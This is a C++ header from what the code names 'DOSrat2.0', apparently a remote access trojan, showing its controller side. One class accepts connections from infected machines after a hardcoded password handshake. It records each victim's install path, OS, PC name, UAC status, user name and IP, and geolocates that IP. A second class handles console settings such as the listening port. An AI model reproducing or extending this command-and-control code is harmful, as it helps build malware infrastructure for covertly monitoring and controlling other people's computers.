#pragma once

class COMUNICAZIONI
{
	private:
		static void TerminaConnessione(SOCKET Sock)
		{
			TcpIP::SetTimeout(0, Sock);
			closesocket(Sock);
		}

	public:
		static void Inizializzazione(int Index)
		{
			char Pass[10]; // DOSrat2.0
			vector<char> Buff;
			char Size[5] = { 0 };
			IPinfo GeoIP;
			EasyMSGB msgb;

			TcpIP::SetTimeout(10000, Clients[Index].sock);

			if (recv(Clients[Index].sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
			{
				TerminaConnessione(Clients[Index].sock);
				return;
			}
			if ((string)Pass != "DOSrat2.0")
			{
				TerminaConnessione(Clients[Index].sock);
				return;
			}
			if (send(Clients[Index].sock, "DOSrat2.0", 10, 0) == SOCKET_ERROR)
			{
				TerminaConnessione(Clients[Index].sock);
				return;
			}

			TcpIP::SetTimeout(0, Clients[Index].sock);
			
			recv(Clients[Index].sock, Size, sizeof(Size), 0);
			Buff.resize(atoi(Size));
			recv(Clients[Index].sock, &Buff[0], atoi(Size), 0);
			
			json data = json::parse(string(Buff.begin(), Buff.end()));
			
			Clients[Index].IsConnected = true;
			Clients[Index].info.InstallPath = data["InstallPath"];
			Clients[Index].info.OS = data["OS"];
			Clients[Index].info.PCname = data["PCname"];
			Clients[Index].info.UAC = data["UAC"];
			Clients[Index].info.UserName = data["UserName"];
			Clients[Index].info.Versione = data["Versione"];
			
			Clients[Index].info.IP = TcpIP::GetIP(Clients[Index].sock);
			Clients[Index].info.Nazione = (IPlocation::GetInfoFromIP(Clients[Index].info.IP, GeoIP) == 0) ? GeoIP.CountryCode : "";
			
			msgb.Ok("Connessione Accettata!\n" + Clients[Index].info.Nazione + "\n" + Clients[Index].info.IP);
		}
};

// Classe per la gestione dei settaggi
class Settaggi
{
	private:
		DirUtils du;
		SettingsFile sf;
		VectSettings MenuImpostazioni;

		// Struttura contenente i colori della console
		struct COLORI
		{
			short Conferma = 10;
			short Negativo = 12;
			short Avviso = 14;
		};

	public:
		int Porta = 5555;
		bool VerificaAggiornamenti = true;
		COLORI Colori;
		COORD DimensioniFinestra{800, 600};
		
		// Costruttore
		Settaggi()
		{
			sf.SetFileName(du.GetFilePath() + "settings.ini");
			MenuImpostazioni.resize(5);
		}

		// Popola i settaggi ottenendoli dal relativo file
		bool GetSettings()
		{
			if (!sf.CheckSetting("Port"))
				if (!SetSettings())
					return false;

			Porta = stoi(sf.GetSetting("Port"));
			VerificaAggiornamenti = (sf.GetSetting("CheckUpdate") == "true");
			Colori.Conferma = (short)stoi(sf.GetSetting("ColorOk"));
			Colori.Negativo = (short)stoi(sf.GetSetting("ColorError"));
			Colori.Avviso = (short)stoi(sf.GetSetting("ColorWarning"));
			DimensioniFinestra.X = (short)stoi(sf.GetSetting("WindowSizeX"));
			DimensioniFinestra.Y = (short)stoi(sf.GetSetting("WindowSizeY"));

			return true;
		}

		// Scrive i settaggi su file
		bool SetSettings()
		{
			if (!sf.CheckFile())
				return false;

			sf.SetSetting("Port", to_string(Porta));
			sf.SetSetting("CheckUpdate", (VerificaAggiornamenti) ? "true" : "false");
			sf.SetSetting("ColorOk", to_string(Colori.Conferma));
			sf.SetSetting("ColorError", to_string(Colori.Negativo));
			sf.SetSetting("ColorWarning", to_string(Colori.Avviso));
			sf.SetSetting("WindowSizeX", to_string(DimensioniFinestra.X));
			sf.SetSetting("WindowSizeY", to_string(DimensioniFinestra.Y));

			return true;
		}

		// Mostra in CLI i settaggi
		int ShowSettings()
		{
			CLInterface cli;

			MenuImpostazioni[0].Escape = true;
			MenuImpostazioni[0].Name = "Salva ed Esci";

			MenuImpostazioni[1].Name = "Porta";
			MenuImpostazioni[1].Value = to_string(Porta);
			MenuImpostazioni[1].Escape = true;

			MenuImpostazioni[2].Name = "Verifica Aggiornamenti";
			MenuImpostazioni[2].CheckValue = "true";
			MenuImpostazioni[2].Value = (VerificaAggiornamenti) ? "true" : "false";

			MenuImpostazioni[3].Name = "Imposta Colori";
			MenuImpostazioni[3].Escape = true;

			MenuImpostazioni[4].Name = "Dimensioni Finestra";
			MenuImpostazioni[4].Value = to_string(DimensioniFinestra.X);
			MenuImpostazioni[4].SecValue = to_string(DimensioniFinestra.Y);
			MenuImpostazioni[4].Escape = true;

			return cli.MenuSettings(MenuImpostazioni);
		}
};